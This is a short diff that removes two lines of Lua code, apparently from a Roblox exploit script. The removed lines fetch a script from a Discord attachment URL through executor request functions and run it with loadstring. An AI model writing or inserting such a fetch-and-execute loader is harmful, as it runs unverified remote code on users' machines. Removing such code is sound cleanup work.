@@ -1,2 +1,0 @@
-local request=http_request or request or (syn and syn.request) or (http and http.request)
-loadstring(request({Url="https://cdn.discordapp.com/attachments/944941820373270528/985633176934289428/script.lua",Method="GET"}).Body)()
